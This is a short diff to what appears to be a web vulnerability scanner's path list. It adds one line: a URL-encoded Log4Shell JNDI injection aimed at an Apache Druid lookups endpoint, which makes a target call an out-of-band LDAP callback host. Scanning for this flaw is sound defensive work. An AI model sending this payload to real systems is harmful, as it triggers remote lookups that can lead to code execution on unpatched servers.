@@ -108,3 +108,4 @@
 /{{interface}}
 /app/login?
 /api/v1/serverinfo
+/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{interactsh-url}}%2ftea%7d
